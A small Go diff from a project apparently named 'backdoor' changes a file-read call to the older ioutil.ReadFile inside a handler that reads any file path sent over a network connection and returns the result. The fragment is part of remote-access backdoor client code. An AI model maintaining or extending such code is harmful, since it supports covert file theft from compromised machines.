@@ -3,6 +3,7 @@ package main
 import (
 	"backdoor/util"
 	"bytes"
+	"io/ioutil"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -143,7 +144,7 @@ func (client *CmdClient) procFileEnd(msg []byte) {
 
 func (client *CmdClient) procDownloadReq(msg []byte) {
 	fpath := strings.TrimSpace(string(msg))
-	contents, err := os.ReadFile(fpath)
+	contents, err := ioutil.ReadFile(fpath)
 	if err != nil {
 		util.SendCmdMsg(client.conn, util.CMD_PRINT, []byte(err.Error()))
 		return
